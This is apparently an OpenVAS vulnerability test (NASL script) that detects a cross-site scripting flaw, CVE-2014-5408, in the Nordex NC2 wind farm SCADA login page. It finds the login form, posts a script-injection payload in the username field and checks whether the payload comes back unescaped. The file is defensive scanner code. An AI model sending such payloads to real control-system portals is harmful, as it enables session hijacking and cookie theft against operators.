###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wind_farm_portal_nc2_xss_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# Nordex NC2 'username' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804789");
  script_version("$Revision: 11402 $");
  script_cve_id("CVE-2014-5408");
  script_bugtraq_id(70851);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-11-11 17:47:43 +0530 (Tue, 11 Nov 2014)");
  script_name("Nordex NC2 'username' Parameter Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Nordex NC2
  and is prone to cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw exists because the application does not
  validate the 'username' parameter upon submission to the login script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser session
  in the context of an affected site.");

  script_tag(name:"affected", value:"Nordex Control 2 (NC2) SCADA V15
  and prior versions");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/98443");
  script_xref(name:"URL", value:"http://www.auscert.org.au/render.html?it=21058");
  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/advisories/ICSA-14-303-01");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

foreach dir (make_list_unique("/", "/nordex", "/nc2", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/index_en.jsp"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(">Nordex Control" >< rcvRes && ">Wind Farm" >< rcvRes)
  {
    url = eregmatch(pattern:"<form .*method=.POST. action=.([a-z0-9/]+).>", string:rcvRes);

    postData = 'connection=basic&userName="><script>alert(document' +
               '.cookie)</script>&pw=&language=en';

    host = http_host_name(port:http_port);
    sndReq = string("POST ", url[1], " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postData), "\r\n",
                    "\r\n", postData, "\r\n");
    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:FALSE);

    if(rcvRes =~ "^HTTP/1\.[01] 200" && '><script>alert(document.cookie)</script>' >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
